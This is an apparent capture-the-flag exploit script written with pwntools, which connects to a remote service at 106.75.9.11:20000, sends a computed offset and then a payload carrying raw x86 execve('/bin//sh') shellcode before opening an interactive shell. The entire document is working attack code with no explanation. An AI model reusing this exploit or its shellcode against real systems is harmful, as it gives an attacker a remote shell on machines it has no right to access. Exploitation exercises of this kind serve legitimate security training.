from pwn import *

context(log_level="debug")

addr  =0x0804A030
bbs  = 0x0804A0A0
offset  = (bbs - addr)/4+1
# p  =process('./tc1')
p = remote('106.75.9.11',20000)
# gdb.attach(p,'b*0x8048641\nc')
shellcode = p32(bbs+4)+ '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
p.recvuntil('de\n')
p.sendline(str(offset))
p.recvuntil(' 110]\n')
p.sendline(shellcode)
p.interactive()